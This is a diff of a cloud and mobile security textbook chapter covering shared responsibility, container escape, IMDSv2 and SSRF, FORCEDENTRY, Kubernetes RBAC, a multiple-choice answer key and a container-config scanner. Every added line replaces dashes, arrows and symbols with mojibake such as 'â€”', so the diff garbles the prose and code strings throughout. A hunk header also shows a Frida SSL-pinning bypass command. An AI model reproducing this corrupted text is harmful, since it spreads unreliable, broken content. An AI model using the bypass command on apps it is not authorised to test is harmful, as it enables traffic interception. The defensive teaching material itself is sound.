@@ -2011,7 +2011,7 @@ frida -U -f com.example.app -l frida-scripts/ssl-bypass.js --no-pause
 
 **Q1: Explain the Shared Responsibility Model and give an example of a common misconfiguration.**
 
-**Answer:** The Shared Responsibility Model divides security responsibilities between the CSP and the customer. Security *of* the Cloud (physical, hardware, networking) is the provider's responsibility. Security *in* the Cloud (data, applications, IAM, network configuration) is the customer's. Example: S3 bucket with public read access — AWS secures the S3 service itself, but the customer is responsible for bucket policies. Leaving a bucket public is a customer-side misconfiguration — and the most common cause of cloud data breaches.
+**Answer:** The Shared Responsibility Model divides security responsibilities between the CSP and the customer. Security *of* the Cloud (physical, hardware, networking) is the provider's responsibility. Security *in* the Cloud (data, applications, IAM, network configuration) is the customer's. Example: S3 bucket with public read access â€” AWS secures the S3 service itself, but the customer is responsible for bucket policies. Leaving a bucket public is a customer-side misconfiguration â€” and the most common cause of cloud data breaches.
 
 **Complexity:** O(1) to understand the concept; O(n) to implement across n services.
 
@@ -2021,7 +2021,7 @@ frida -U -f com.example.app -l frida-scripts/ssl-bypass.js --no-pause
 - **CSPM** (Cloud Security Posture Management): Checks misconfigurations and compliance against benchmarks (CIS, NIST, SOC 2). Tools: AWS Config, Wiz, Prisma Cloud.
 - **CWPP** (Cloud Workload Protection Platform): Protects workloads (VMs, containers, serverless) with anti-malware, intrusion detection, and FIM. Tools: CrowdStrike, Trend Micro, Falco.
 - **CASB** (Cloud Access Security Broker): Sits between users and cloud apps for DLP, shadow IT discovery, and access control. Modes: API, forward proxy, reverse proxy. Tools: Netskope, Zscaler, McAfee MVISION.
-- **CIEM** (Cloud Infrastructure Entitlement Management): Manages cloud IAM permissions at scale — detects unused permissions, over-privileged roles, and cross-account access paths. Tools: AWS IAM Access Analyzer, Ermetic, CloudSplainer.
+- **CIEM** (Cloud Infrastructure Entitlement Management): Manages cloud IAM permissions at scale â€” detects unused permissions, over-privileged roles, and cross-account access paths. Tools: AWS IAM Access Analyzer, Ermetic, CloudSplainer.
 
 **Edge Case:** These tools overlap. A modern CNAPP (Cloud Native Application Protection Platform) integrates CSPM + CWPP + CIEM capabilities.
 
@@ -2044,11 +2044,11 @@ frida -U -f com.example.app -l frida-scripts/ssl-bypass.js --no-pause
 **Answer:** A SSRF vulnerability in ModSecurity WAF allowed the attacker to query the EC2 metadata endpoint (`169.254.169.254`), retrieve IAM role credentials, and access S3 buckets containing 100M+ customer records.
 
 **Prevention:**
-1. **IMDSv2 mandatory** — requires session token for metadata access.
-2. **Least privilege IAM** — WAF role should NOT have S3:ListAllBuckets.
-3. **WAF rules to block SSRF** — block requests to 169.254.169.254 and other internal IPs.
-4. **Network-level protection** — metadata endpoint access restricted via hop limit.
-5. **SCP** — Service Control Policy to limit resource access at the OU level.
+1. **IMDSv2 mandatory** â€” requires session token for metadata access.
+2. **Least privilege IAM** â€” WAF role should NOT have S3:ListAllBuckets.
+3. **WAF rules to block SSRF** â€” block requests to 169.254.169.254 and other internal IPs.
+4. **Network-level protection** â€” metadata endpoint access restricted via hop limit.
+5. **SCP** â€” Service Control Policy to limit resource access at the OU level.
 
 **Q5: Compare serverless security vs traditional VM security.**
 
@@ -2073,25 +2073,25 @@ frida -U -f com.example.app -l frida-scripts/ssl-bypass.js --no-pause
 **Q6: What is a container escape and how do you prevent it?**
 
 **Answer:** Container escape is when a process breaks out of the container namespace isolation to access the host OS. Attack vectors include:
-- Kernel exploit via a vulnerable syscall (CVE-2022-0492 — cgroup escape).
+- Kernel exploit via a vulnerable syscall (CVE-2022-0492 â€” cgroup escape).
 - Misconfigured capabilities (CAP_SYS_ADMIN, CAP_DAC_OVERRIDE).
 - Mounting host paths (docker.sock, /proc, /sys).
-- Privileged container (—privileged flag).
+- Privileged container (â€”privileged flag).
 
 **Prevention (defense in depth):**
 1. Run as non-root (`USER appuser` in Dockerfile).
-2. Drop all capabilities (`—cap-drop ALL —cap-add NET_BIND_SERVICE`).
+2. Drop all capabilities (`â€”cap-drop ALL â€”cap-add NET_BIND_SERVICE`).
 3. Use seccomp profile (default or custom).
 4. Enable AppArmor/SELinux.
-5. Read-only root filesystem (`—read-only`).
+5. Read-only root filesystem (`â€”read-only`).
 6. Pod Security Standards (`restricted` level).
 7. User namespace remapping (re-map container UID 0 to non-privileged host UID).
 
 **Q7: What is the difference between a Role and a ClusterRole in Kubernetes?**
 
 **Answer:**
-- **Role:** Namespaced — grants permissions within a single namespace. Use for app-specific access (e.g., "developer can manage pods in namespace `staging`").
-- **ClusterRole:** Cluster-wide — grants permissions across all namespaces (resources like pods, services), cluster-scoped resources (nodes, PVs, CSIDrivers), and non-resource endpoints (/healthz, /livez).
+- **Role:** Namespaced â€” grants permissions within a single namespace. Use for app-specific access (e.g., "developer can manage pods in namespace `staging`").
+- **ClusterRole:** Cluster-wide â€” grants permissions across all namespaces (resources like pods, services), cluster-scoped resources (nodes, PVs, CSIDrivers), and non-resource endpoints (/healthz, /livez).
 
 **Decision rule:** If the resource is namespaced (pods, services, deployments) and the access should be limited to one namespace, use Role + RoleBinding. If the resource is cluster-scoped (nodes, storage classes) or the access should apply globally, use ClusterRole + ClusterRoleBinding.
 
@@ -2119,10 +2119,10 @@ Lambda B (calls Lambda C for each sub-item)
 This creates exponential cost (1000 Lambda B invocations * N sub-items) and latency (sequential execution).
 
 **Solutions:**
-1. **Step Functions** — orchestrate workflow with parallel execution branches.
-2. **SQS + batch processing** — buffer items in SQS, process in batch of 10 per invocation.
-3. **DynamoDB Streams + Lambda** — fan-out without recursive function calls.
-4. **EventBridge Pipes** — source-to-target with optional enrichment.
+1. **Step Functions** â€” orchestrate workflow with parallel execution branches.
+2. **SQS + batch processing** â€” buffer items in SQS, process in batch of 10 per invocation.
+3. **DynamoDB Streams + Lambda** â€” fan-out without recursive function calls.
+4. **EventBridge Pipes** â€” source-to-target with optional enrichment.
 
 **Q10: Explain envelope encryption and why it's used in cloud environments.**
 
@@ -2149,10 +2149,10 @@ This creates exponential cost (1000 Lambda B invocations * N sub-items) and late
 
 **Q12: What is the FORCEDENTRY vulnerability and why was it significant?**
 
-**Answer:** FORCEDENTRY (CVE-2021-30860) was a zero-click iOS exploit used by NSO Group's Pegasus spyware. It exploited an integer overflow in CoreGraphics PDF parser triggered by receiving an iMessage — no user interaction required.
+**Answer:** FORCEDENTRY (CVE-2021-30860) was a zero-click iOS exploit used by NSO Group's Pegasus spyware. It exploited an integer overflow in CoreGraphics PDF parser triggered by receiving an iMessage â€” no user interaction required.
 
 **Significance:**
-1. First widely-known zero-click iOS exploit — no user tap needed.
+1. First widely-known zero-click iOS exploit â€” no user tap needed.
 2. Affected fully-patched iOS devices (iOS 14.6).
 3. Demonstrated that sandbox + code signing alone are insufficient against state-level actors.
 4. Led directly to BlastDoor isolation architecture in iOS 14+ (iMessage processing in separate sandboxed daemon).
@@ -2166,21 +2166,21 @@ This creates exponential cost (1000 Lambda B invocations * N sub-items) and late
 3. **SQLite databases:** Check for unencrypted PII in `.db` files.
 4. **Logcat/console logs:** Monitor `adb logcat` for sensitive data in logs.
 5. **Cache directory:** Check WebView cache, image cache for sensitive content.
-6. **Keychain/Keystore:** Verify accessibility level — `kSecAttrAccessibleWhenUnlockedThisDeviceOnly` for iOS, `EncryptedSharedPreferences` for Android.
-7. **Backup:** Check if app allows backup (android:allowBackup="true") — sensitive data may leak via ADB backup.
+6. **Keychain/Keystore:** Verify accessibility level â€” `kSecAttrAccessibleWhenUnlockedThisDeviceOnly` for iOS, `EncryptedSharedPreferences` for Android.
+7. **Backup:** Check if app allows backup (android:allowBackup="true") â€” sensitive data may leak via ADB backup.
 8. **Clipboard:** Verify app doesn't copy sensitive data to clipboard (accessible by other apps).
 
 **Q14: What is MDM and how does it differ from MAM?**
 
 **Answer:**
-- **MDM** (Mobile Device Management): Manages the entire device — passcode policy, encryption enforcement, remote wipe, network configuration, app whitelist/blacklist. Used for corporate-owned devices where the company has full control.
-- **MAM** (Mobile Application Management): Manages only specific applications — app configuration, data leakage prevention (copy/paste restrictions, screen capture blocking), app-level wipe. Used for BYOD scenarios where the device is personal but work apps need protection.
+- **MDM** (Mobile Device Management): Manages the entire device â€” passcode policy, encryption enforcement, remote wipe, network configuration, app whitelist/blacklist. Used for corporate-owned devices where the company has full control.
+- **MAM** (Mobile Application Management): Manages only specific applications â€” app configuration, data leakage prevention (copy/paste restrictions, screen capture blocking), app-level wipe. Used for BYOD scenarios where the device is personal but work apps need protection.
 
 **BYOD best practice:** Use MAM + OS-level work profile (Android Work Profile, iOS User Enrollment) rather than full MDM. This protects corporate data without compromising the employee's privacy.
 
 **Q15: Explain the OWASP Mobile Top 10 M5 vulnerability and how to fix it.**
 
-**Answer:** M5 — Insecure Communication: Mobile app transmits sensitive data over an insecure channel (unencrypted HTTP, weak TLS, missing certificate validation).
+**Answer:** M5 â€” Insecure Communication: Mobile app transmits sensitive data over an insecure channel (unencrypted HTTP, weak TLS, missing certificate validation).
 
 **Detection:**
 1. Intercept traffic with Burp Suite.
@@ -2216,23 +2216,23 @@ This creates exponential cost (1000 Lambda B invocations * N sub-items) and late
 
 | Takeaway | Application |
 |----------|-------------|
-| Shared Responsibility Model | Know your boundary — in IaaS you patch the OS, in PaaS you secure the app, in SaaS you manage access; never assume the provider secures your data |
+| Shared Responsibility Model | Know your boundary â€” in IaaS you patch the OS, in PaaS you secure the app, in SaaS you manage access; never assume the provider secures your data |
 | Container & Kubernetes Security | Run containers as non-root, use read-only rootfs, implement Pod Security Standards, enforce Network Policies, scan images with Trivy |
 | Cloud IAM Least Privilege | Start with implicit deny, use resource-level permissions, simulate policies before deployment, review unused permissions quarterly |
 | Cloud Data Protection | Use envelope encryption with KMS, enforce IMDSv2 on EC2, enable S3 Block Public Access, encrypt data at rest and in transit |
 | Serverless Security | Validate all event inputs, use least-privilege IAM roles, store secrets in Secrets Manager, set function concurrency limits |
-| Mobile OS & App Security | Harden Android with Work Profile and iOS with User Enrollment; follow OWASP Mobile Top 10 — focus on M5 and M7 |
+| Mobile OS & App Security | Harden Android with Work Profile and iOS with User Enrollment; follow OWASP Mobile Top 10 â€” focus on M5 and M7 |
 | Cloud Compliance Automation | Use CSPM tools (AWS Config, Azure Policy) for continuous compliance, IaC scanning (Checkov, tfsec) pre-deployment, and CIEM for permission hygiene |
 
 ---
 
 ## Summary
 
-- **Cloud Service Models:** IaaS, PaaS, SaaS — each shifts responsibility boundaries. Know exactly what you secure in each model.
+- **Cloud Service Models:** IaaS, PaaS, SaaS â€” each shifts responsibility boundaries. Know exactly what you secure in each model.
 - **Shared Responsibility:** Provider secures *of* the cloud; customer secures *in* the cloud. Common failure: assuming the provider secures your data.
 - **Virtualization Security:** Hypervisor attacks (VM escape, side-channel), VM sprawl, hyperjacking. Isolation is the primary concern.
 - **Container Security:** Docker CIS benchmarks, K8s RBAC, Pod Security Standards, network policies, admission controllers, Falco runtime.
-- **Serverless Security:** OWASP Serverless Top 10 — event injection, excessive permissions, insecure deployment.
+- **Serverless Security:** OWASP Serverless Top 10 â€” event injection, excessive permissions, insecure deployment.
 - **Cloud Compliance:** CIS benchmarks (AWS/Azure/GCP), CSPM for posture, CWPP for workloads, CASB for access, CIEM for entitlements.
 - **Cloud IAM:** Least privilege, policy simulation, Access Analyzer, SCPs. Deny always wins.
 - **Cloud Data Protection:** KMS, HSM, envelope encryption. Never store encrypted data and key together.
@@ -2252,21 +2252,21 @@ This creates exponential cost (1000 Lambda B invocations * N sub-items) and late
 
 <details>
 <summary>Solution</summary>
-The cloud provider patches the runtime environment (OS, middleware, runtime engine). The customer is responsible for patching their application code and managing access controls. The split varies by service — serverless (Lambda) the provider patches everything below the code; container platforms (EKS) the customer patches the container OS.
+The cloud provider patches the runtime environment (OS, middleware, runtime engine). The customer is responsible for patching their application code and managing access controls. The split varies by service â€” serverless (Lambda) the provider patches everything below the code; container platforms (EKS) the customer patches the container OS.
 </details>
 
 2. What is the difference between IMDSv1 and IMDSv2? Why did AWS make IMDSv2 the default?
 
 <details>
 <summary>Solution</summary>
-IMDSv1: direct request to 169.254.169.254 — vulnerable to SSRF (any HTTP request can read metadata). IMDSv2: requires a PUT request to obtain a session token, then includes the token in subsequent GET requests — prevents simple SSRF because the token fetch is a separate step. AWS made v2 default because v1 is a common attack vector (Capital One 2019 breach).
+IMDSv1: direct request to 169.254.169.254 â€” vulnerable to SSRF (any HTTP request can read metadata). IMDSv2: requires a PUT request to obtain a session token, then includes the token in subsequent GET requests â€” prevents simple SSRF because the token fetch is a separate step. AWS made v2 default because v1 is a common attack vector (Capital One 2019 breach).
 </details>
 
 3. Explain how a Kubernetes Network Policy enforces micro-segmentation.
 
 <details>
 <summary>Solution</summary>
-NetworkPolicies are firewall rules at the pod level using label selectors. Default-deny ingress/egress is applied at the namespace level. Allow rules specify which pods (by labels), namespaces, IP blocks, and ports can communicate. This isolates workloads — a compromised pod in namespace A cannot reach pods in namespace B unless explicitly allowed.
+NetworkPolicies are firewall rules at the pod level using label selectors. Default-deny ingress/egress is applied at the namespace level. Allow rules specify which pods (by labels), namespaces, IP blocks, and ports can communicate. This isolates workloads â€” a compromised pod in namespace A cannot reach pods in namespace B unless explicitly allowed.
 </details>
 
 4. What is the difference between KMS and HSM? When would you use each?
@@ -2280,21 +2280,21 @@ KMS (Key Management Service): software-based key management, FIPS 140-2 Level 2/
 
 <details>
 <summary>Solution</summary>
-Work Profile creates a separate encrypted container on the device. Corporate apps and data are isolated from personal apps — no cross-access. IT can manage work apps (wipe, enforce passcode) without accessing personal data. Separation is enforced at the kernel level via SELinux. When the work profile is removed, only corporate data is deleted.
+Work Profile creates a separate encrypted container on the device. Corporate apps and data are isolated from personal apps â€” no cross-access. IT can manage work apps (wipe, enforce passcode) without accessing personal data. Separation is enforced at the kernel level via SELinux. When the work profile is removed, only corporate data is deleted.
 </details>
 
 6. What is the purpose of Falco's syscall monitoring? How does it differ from vulnerability scanning?
 
 <details>
 <summary>Solution</summary>
-Falco monitors kernel syscalls at runtime to detect anomalous behavior (e.g., shell in container, privilege escalation, file access outside allowed paths). Vulnerability scanning is static — it checks container images for known CVEs before deployment. Falco catches runtime attacks that bypass static checks — zero-day exploits, compromised credentials, malicious insiders.
+Falco monitors kernel syscalls at runtime to detect anomalous behavior (e.g., shell in container, privilege escalation, file access outside allowed paths). Vulnerability scanning is static â€” it checks container images for known CVEs before deployment. Falco catches runtime attacks that bypass static checks â€” zero-day exploits, compromised credentials, malicious insiders.
 </details>
 
 7. Explain the FORCEDENTRY exploit chain from initial access to data exfiltration.
 
 <details>
 <summary>Solution</summary>
-FORCEDENTRY (2021) exploited a CoreGraphics PDF parsing vulnerability (CVE-2021-30860) in iMessage. Chain: 1) Attacker sends a malicious PDF via iMessage. 2) PDF parser overflow leads to kernel-level code execution. 3) Pegasus spyware installed with full device access (mic, camera, messages, location). 4) Data exfiltration via encrypted C2. No user interaction required — zero-click exploit.
+FORCEDENTRY (2021) exploited a CoreGraphics PDF parsing vulnerability (CVE-2021-30860) in iMessage. Chain: 1) Attacker sends a malicious PDF via iMessage. 2) PDF parser overflow leads to kernel-level code execution. 3) Pegasus spyware installed with full device access (mic, camera, messages, location). 4) Data exfiltration via encrypted C2. No user interaction required â€” zero-click exploit.
 </details>
 
 ### Application Problems
@@ -2302,7 +2302,7 @@ FORCEDENTRY (2021) exploited a CoreGraphics PDF parsing vulnerability (CVE-2021-
 
 <details>
 <summary>Solution</summary>
-A01 (Broken Access Control): EC2 security groups → API Gateway resource policies + Lambda IAM roles. A03 (Injection): WAF on ALB → API Gateway WAF integration. A05 (Misconfiguration): OS patching (EC2) → provider-managed runtime (Lambda). A06 (Vulnerable Components): container/image scanning → Lambda layer scanning. A10 (SSRF): IMDS protection → Lambda execution role (no IMDS access by default). Network isolation shifts from VPC/subnet to IAM permissions.
+A01 (Broken Access Control): EC2 security groups â†’ API Gateway resource policies + Lambda IAM roles. A03 (Injection): WAF on ALB â†’ API Gateway WAF integration. A05 (Misconfiguration): OS patching (EC2) â†’ provider-managed runtime (Lambda). A06 (Vulnerable Components): container/image scanning â†’ Lambda layer scanning. A10 (SSRF): IMDS protection â†’ Lambda execution role (no IMDS access by default). Network isolation shifts from VPC/subnet to IAM permissions.
 </details>
 
 2. Design a least-privilege IAM policy for a CI/CD pipeline that deploys to EKS, reads from ECR, and writes logs to CloudWatch.
@@ -2344,7 +2344,7 @@ spec:
   - to:
     - namespaceSelector: { matchLabels: { name: monitoring } }
 ```
-Default-deny for all other ingress/egress — only monitoring namespace can reach payment pods.
+Default-deny for all other ingress/egress â€” only monitoring namespace can reach payment pods.
 </details>
 
 4. Write an Android application snippet that uses EncryptedSharedPreferences and explain each configuration parameter.
@@ -2387,21 +2387,21 @@ AES256_SIV for keys (deterministic, allows key lookup), AES256_GCM for values (a
 
 <details>
 <summary>Solution</summary>
-APT10 targeted managed service providers (MSPs) to gain access to their clients. Phase 1 (Initial Access T1078): Spear-phishing MSP employees. Phase 2 (Persistence T1133): VPN credentials theft. Phase 3 (Lateral Movement T1021): Move from MSP to client environments using trusted connections. Phase 4 (Collection T1005): Exfiltrate IP and trade secrets. Significance: supply chain attack — compromising one MSP gave access to dozens of clients.
+APT10 targeted managed service providers (MSPs) to gain access to their clients. Phase 1 (Initial Access T1078): Spear-phishing MSP employees. Phase 2 (Persistence T1133): VPN credentials theft. Phase 3 (Lateral Movement T1021): Move from MSP to client environments using trusted connections. Phase 4 (Collection T1005): Exfiltrate IP and trade secrets. Significance: supply chain attack â€” compromising one MSP gave access to dozens of clients.
 </details>
 
 2. Design a zero-trust architecture for a mobile workforce. Include: conditional access policies, device compliance rules, app protection policies, and data loss prevention controls for both iOS and Android devices.
 
 <details>
 <summary>Solution</summary>
-Conditional Access: MFA required, device must be MDM-enrolled, OS version ≥ current-1, geo-fencing for sensitive apps. Device Compliance: disk encryption enabled, no root/jailbreak, passcode ≥ 6 digits, recent security patch. App Protection: app-level PIN, app proxy for data access, prevent screenshots of work apps, encrypted shared storage. DLP: prevent copy/paste from work to personal apps, block file downloads to personal cloud, remote wipe of corporate data only.
+Conditional Access: MFA required, device must be MDM-enrolled, OS version â‰¥ current-1, geo-fencing for sensitive apps. Device Compliance: disk encryption enabled, no root/jailbreak, passcode â‰¥ 6 digits, recent security patch. App Protection: app-level PIN, app proxy for data access, prevent screenshots of work apps, encrypted shared storage. DLP: prevent copy/paste from work to personal apps, block file downloads to personal cloud, remote wipe of corporate data only.
 </details>
 
 3. Design a secure CI/CD pipeline that uses ephemeral credentials (OIDC), container image signing (Cosign), and admission controller enforcement (Kyverno) to prevent attackers from injecting malicious code through the build pipeline.
 
 <details>
 <summary>Solution</summary>
-1) Developer pushes code → GitHub Actions triggered. 2) OIDC-based authentication to AWS/GCP (no static secrets). 3) Build container image, scan for CVEs (Trivy). 4) Sign image with Cosign using keyless signing (OIDC + Fulcio). 5) Push to registry, store attestation (signed SBOM). 6) Kyverno admission controller in cluster verifies: image is signed, attestation matches, CVE score below threshold. 7) If valid → pod is admitted. If invalid → deployment is blocked.
+1) Developer pushes code â†’ GitHub Actions triggered. 2) OIDC-based authentication to AWS/GCP (no static secrets). 3) Build container image, scan for CVEs (Trivy). 4) Sign image with Cosign using keyless signing (OIDC + Fulcio). 5) Push to registry, store attestation (signed SBOM). 6) Kyverno admission controller in cluster verifies: image is signed, attestation matches, CVE score below threshold. 7) If valid â†’ pod is admitted. If invalid â†’ deployment is blocked.
 </details>
 
 ### Concept Comparison
@@ -2435,7 +2435,7 @@ Conditional Access: MFA required, device must be MDM-enrolled, OS version ≥ cu
 
 | # | Question | A | B | C | D | Answer |
 |---|----------|---|---|---|---|--------|
-| 1 | In IaaS, who patches the guest OS? | Cloud provider | Customer | Shared between provider and customer | No one — IaaS doesn't have guest OS | B |
+| 1 | In IaaS, who patches the guest OS? | Cloud provider | Customer | Shared between provider and customer | No one â€” IaaS doesn't have guest OS | B |
 | 2 | Which tool runs a CIS benchmark against a Kubernetes cluster? | kube-bench | kube-hunter | Trivy | Falco | A |
 | 3 | The Capital One 2019 breach was caused by: | SQL injection | SSRF to EC2 metadata endpoint | Weak S3 bucket password | Compromised employee credentials | B |
 | 4 | OWASP Mobile Top 10 M7 is: | Insecure Communication | Insecure Data Storage | Improper Platform Usage | Insufficient Cryptography | B |
@@ -2731,14 +2731,14 @@ class ContainerScanner {
     // Check 1: Running as root (CIS 4.1)
     if (!image.user || image.user === 'root') {
       issues.push(
-        'CRITICAL: Container runs as root — use a non-root user directive (USER 1000)'
+        'CRITICAL: Container runs as root â€” use a non-root user directive (USER 1000)'
       );
     }
 
     // Check 2: Privileged mode (CIS 5.1)
     if (image.privileged) {
       issues.push(
-        'CRITICAL: Privileged mode enabled — grants all host capabilities, bypassing namespace isolation'
+        'CRITICAL: Privileged mode enabled â€” grants all host capabilities, bypassing namespace isolation'
       );
     }
 
@@ -2757,7 +2757,7 @@ class ContainerScanner {
       for (const pattern of sensitivePatterns) {
         if (key.toUpperCase().includes(pattern)) {
           issues.push(
-            `HIGH: Potential secret exposure in env var "${key}" — use Docker secrets or a vault`
+            `HIGH: Potential secret exposure in env var "${key}" â€” use Docker secrets or a vault`
           );
           break;
         }
@@ -2767,32 +2767,32 @@ class ContainerScanner {
     // Check 4: Exposed Docker socket (CIS 6.1)
     if (image.exposedPorts.includes(2375) || image.exposedPorts.includes(2376)) {
       issues.push(
-        'CRITICAL: Docker socket exposed (port 2375/2376) — host compromise via container escape'
+        'CRITICAL: Docker socket exposed (port 2375/2376) â€” host compromise via container escape'
       );
     }
 
     // Check 5: Missing AppArmor profile (CIS 5.9)
     if (!image.appArmorProfile) {
       issues.push(
-        'MEDIUM: No AppArmor profile applied — consider docker-default or a custom profile'
+        'MEDIUM: No AppArmor profile applied â€” consider docker-default or a custom profile'
       );
     }
 
     // Check 6: Missing seccomp profile (CIS 5.8)
     if (!image.seccompProfile) {
       issues.push(
-        'MEDIUM: No seccomp profile applied — restrict syscalls with a default or custom profile'
+        'MEDIUM: No seccomp profile applied â€” restrict syscalls with a default or custom profile'
       );
     }
 
     // Check 7: Writable root filesystem (CIS 5.12)
     if (!image.readOnlyRootFilesystem) {
       issues.push(
-        'MEDIUM: Root filesystem is writable — set readOnlyRootFilesystem: true and mount tmpfs for temp data'
+        'MEDIUM: Root filesystem is writable â€” set readOnlyRootFilesystem: true and mount tmpfs for temp data'
       );
     }
 
-    // Check 8: Dangerous capabilities (CIS 5.3–5.7)
+    // Check 8: Dangerous capabilities (CIS 5.3â€“5.7)
     const dangerousCaps = [
       'SYS_ADMIN',
       'NET_ADMIN',
@@ -2804,7 +2804,7 @@ class ContainerScanner {
     for (const cap of image.capabilities || []) {
       if (dangerousCaps.includes(cap)) {
         issues.push(
-          `HIGH: Dangerous capability "${cap}" granted — drop all (--cap-drop=ALL) and add only required caps`
+          `HIGH: Dangerous capability "${cap}" granted â€” drop all (--cap-drop=ALL) and add only required caps`
         );
       }
     }
@@ -2834,7 +2834,7 @@ const image: ContainerImage = {
 const vulns = scanner.scanImage(image);
 console.log(`Found ${vulns.length} CVEs in image layers:`);
 vulns.forEach((v) =>
-  console.log(`  ${v.cve} (${v.severity}) — ${v.package} → fix: ${v.fixVersion}`)
+  console.log(`  ${v.cve} (${v.severity}) â€” ${v.package} â†’ fix: ${v.fixVersion}`)
 );
 
 // Run configuration audit
@@ -2887,7 +2887,7 @@ flowchart TD
         LinuxKernel -->|"UID Isolation"| UIDIsolation["UID-based<br/>Sandboxing"]
     end
     subgraph IPC["Inter-Process Communication"]
-        IPC_Restrict["<b>Restricted by design:</b><br/>• iOS: XPC services only<br/>• Android: Binder with permission checks<br/>• No shared memory between apps"]
+        IPC_Restrict["<b>Restricted by design:</b><br/>â€¢ iOS: XPC services only<br/>â€¢ Android: Binder with permission checks<br/>â€¢ No shared memory between apps"]
     end
     iOS_Kernel -.-> IPC_Restrict
     LinuxKernel -.-> IPC_Restrict
@@ -2897,20 +2897,20 @@ flowchart TD
 
 ## Further Reading
 
-- **NIST SP 800-145** — NIST Definition of Cloud Computing
-- **OWASP Serverless Top 10** — Serverless security risks and mitigations
-- **OWASP Mobile Top 10 (2024)** — Mobile application security risks
-- **CIS Benchmarks** — aws.cisecurity.org, azure.cisecurity.org, gcp.cisecurity.org
-- **NSA/CISA Kubernetes Hardening Guidance** — K8s security best practices (August 2021, updated 2022)
-- **Falco Documentation** — Runtime security and rule authoring
-- **MITRE ATT&CK: Cloud Matrix** — Cloud-specific adversary techniques
-- **Amnesty International Pegasus Project** — Mobile spyware investigation reports
-- **Aqua Security Trivy Documentation** — Container and K8s vulnerability scanning
-- **Apple Platform Security Guide** — iOS security architecture deep dive
-- **Android Security and Privacy** — AOSP security documentation
-- **dolosgroup.io/blog/capital-one-breach** — Deep dive into Capital One 2019
+- **NIST SP 800-145** â€” NIST Definition of Cloud Computing
+- **OWASP Serverless Top 10** â€” Serverless security risks and mitigations
+- **OWASP Mobile Top 10 (2024)** â€” Mobile application security risks
+- **CIS Benchmarks** â€” aws.cisecurity.org, azure.cisecurity.org, gcp.cisecurity.org
+- **NSA/CISA Kubernetes Hardening Guidance** â€” K8s security best practices (August 2021, updated 2022)
+- **Falco Documentation** â€” Runtime security and rule authoring
+- **MITRE ATT&CK: Cloud Matrix** â€” Cloud-specific adversary techniques
+- **Amnesty International Pegasus Project** â€” Mobile spyware investigation reports
+- **Aqua Security Trivy Documentation** â€” Container and K8s vulnerability scanning
+- **Apple Platform Security Guide** â€” iOS security architecture deep dive
+- **Android Security and Privacy** â€” AOSP security documentation
+- **dolosgroup.io/blog/capital-one-breach** â€” Deep dive into Capital One 2019
 
 ---
 
-*End of Chapter 7 — Cloud & Mobile Security*
+*End of Chapter 7 â€” Cloud & Mobile Security*
 
